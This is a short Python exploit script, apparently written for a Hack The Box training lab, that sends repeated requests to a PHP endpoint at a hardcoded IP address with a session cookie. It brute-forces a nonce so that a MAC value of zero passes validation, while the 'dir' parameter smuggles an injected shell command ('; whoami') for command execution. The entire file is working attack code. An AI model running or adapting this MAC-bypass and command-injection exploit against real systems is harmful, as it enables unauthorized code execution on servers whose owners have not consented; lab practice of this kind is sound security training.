import requests

URL = "http://94.237.53.3:53673/dir.php"
COOKIES = {"PHPSESSID": "homv8qk8laif901u2j867g5tim"}

DIR = "/home/htb-stdnt/; whoami"
MAC = 0
MAX_NONCE = 20000

def prepare_params(nonce):
    return {
        "dir": DIR,
        "nonce": nonce,
        "mac": MAC
    }

def make_request(nonce):
    return requests.get(URL, cookies=COOKIES, params=prepare_params(nonce))

# main
for n in range(MAX_NONCE):
    r = make_request(n)

    if not "Error! Invalid MAC" in r.text:
        print("Found valid MAC:")
        print(r.url)
        break
